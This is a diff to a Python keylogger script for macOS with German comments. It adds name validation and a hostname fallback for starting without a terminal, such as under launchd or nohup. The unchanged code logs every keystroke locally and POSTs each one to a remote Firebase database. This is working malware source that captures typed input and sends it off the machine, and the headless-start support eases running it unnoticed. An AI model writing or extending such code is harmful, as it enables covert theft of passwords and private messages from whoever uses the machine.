@@ -2,6 +2,7 @@ import os
 import json
 import datetime
 import threading
+import re
 from pathlib import Path
 
 import requests
@@ -24,23 +25,76 @@ CONFIG_DIR  = Path.home() / ".macbook_keylogger"
 CONFIG_FILE = CONFIG_DIR / "config.json"
 LOG_DIR     = Path.home() / "Documents" / "KeyLogs"
 
+# Nur a-z, A-Z, 0-9 – keine Umlaute, keine Sonderzeichen, keine Leerzeichen
+NAME_PATTERN = re.compile(r"^[A-Za-z0-9]+$")
+NAME_MIN_LEN = 1
+NAME_MAX_LEN = 40
+
 
 # ---------------------------------------------------------------
 # 1) MacBook-Name einmalig abfragen und speichern
 # ---------------------------------------------------------------
+def is_valid_name(name: str) -> bool:
+    return (
+        NAME_MIN_LEN <= len(name) <= NAME_MAX_LEN
+        and bool(NAME_PATTERN.match(name))
+    )
+
+
+def ask_name_interactive() -> str:
+    """Fragt so lange, bis ein gültiger Name eingegeben wurde."""
+    print()
+    print("Name des MacBooks:")
+    print("  • nur Buchstaben (a-z, A-Z) und Zahlen (0-9)")
+    print("  • keine Umlaute (ä ö ü ß), keine Sonderzeichen, keine Leerzeichen")
+    print(f"  • Länge: {NAME_MIN_LEN}–{NAME_MAX_LEN} Zeichen")
+    print()
+
+    while True:
+        raw = input("Name: ").strip()
+        if not raw:
+            print("[!] Darf nicht leer sein. Bitte erneut versuchen.\n")
+            continue
+        if not is_valid_name(raw):
+            print("[!] Ungültig. Nur a-z, A-Z und 0-9 erlaubt.\n")
+            continue
+        return raw
+
+
 def load_or_ask_macbook_name():
     CONFIG_DIR.mkdir(parents=True, exist_ok=True)
+
+    # 1) Konfiguration vorhanden? -> lesen und validieren
     if CONFIG_FILE.exists():
         try:
             name = json.loads(CONFIG_FILE.read_text(encoding="utf-8")).get("macbook_name")
-            if name:
+            if name and is_valid_name(name):
                 print(f"[i] MacBook-Name: {name}")
                 return name
+            if name:
+                print(f"[!] Gespeicherter Name ungültig: {name!r} – wird neu abgefragt.")
         except Exception:
-            pass
+            print("[!] config.json konnte nicht gelesen werden – wird neu erstellt.")
 
-    name = input("Name deines MacBooks: ").strip() or "Unbenanntes-MacBook"
-    CONFIG_FILE.write_text(json.dumps({"macbook_name": name}, indent=2), encoding="utf-8")
+    # 2) Kein Terminal? (z. B. Start über launchd/nohup ohne tty)
+    #    Dann können wir nicht interaktiv fragen -> eindeutigen Fallback nutzen.
+    if not os.isatty(0):
+        import socket
+        hostname = re.sub(r"[^A-Za-z0-9]", "", socket.gethostname()) or "MacBook"
+        hostname = hostname[:NAME_MAX_LEN]
+        CONFIG_FILE.write_text(
+            json.dumps({"macbook_name": hostname}, indent=2),
+            encoding="utf-8",
+        )
+        print(f"[i] Kein Terminal – Fallback-Name gesetzt: {hostname}")
+        return hostname
+
+    # 3) Interaktiv abfragen
+    name = ask_name_interactive()
+    CONFIG_FILE.write_text(
+        json.dumps({"macbook_name": name}, indent=2),
+        encoding="utf-8",
+    )
     print(f"[✓] Gespeichert: {CONFIG_FILE}")
     return name
 
@@ -57,7 +111,6 @@ class KeyLogger:
         today = datetime.date.today().isoformat()
         self.log_file = LOG_DIR / f"keys_{macbook_name}_{today}.log"
 
-        # Firebase-Pfad für heute
         self.fb_path = f"{DB_URL}/logs/{macbook_name}/{today}.json"
         self.session = requests.Session()
 
@@ -72,12 +125,10 @@ class KeyLogger:
             "macbook": self.macbook_name,
         }
 
-        # lokal anhängen
         with self.lock:
             with self.log_file.open("a", encoding="utf-8") as f:
                 f.write(json.dumps(payload, ensure_ascii=False) + "\n")
 
-        # Firebase: POST = neuer Eintrag mit Auto-ID (wie push())
         try:
             r = self.session.post(self.fb_path, json=payload, timeout=5)
             if r.status_code >= 300:
@@ -120,7 +171,7 @@ def main():
     name = load_or_ask_macbook_name()
     logger = KeyLogger(name)
 
-    print(f"[i] Lokal:  {logger.log_file}")
+    print(f"[i] Lokal:    {logger.log_file}")
     print(f"[i] Firebase: {logger.fb_path}")
     print("Läuft … ESC beendet.\n")
 
